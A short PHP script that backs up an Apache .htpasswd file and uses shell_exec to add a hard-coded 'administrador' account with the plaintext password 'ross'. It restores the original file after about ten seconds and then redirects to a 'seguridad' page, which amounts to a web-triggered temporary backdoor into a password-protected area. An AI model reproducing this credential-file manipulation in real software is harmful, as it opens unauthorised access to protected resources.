<?php 

echo shell_exec("cp /etc/apache2/special/.htpasswd /etc/apache2/special/.ht"); 
echo shell_exec("sleep 1");
//copy('/etc/apache2/special/.htpasswd', '/etc/apache2/special/.ht');
echo shell_exec("htpasswd -b /etc/apache2/special/.htpasswd administrador ross");
echo shell_exec("sleep 9");
echo shell_exec("cp /etc/apache2/special/.ht /etc/apache2/special/.htpasswd"); 
header('Location: '."../seguridad");

?> 
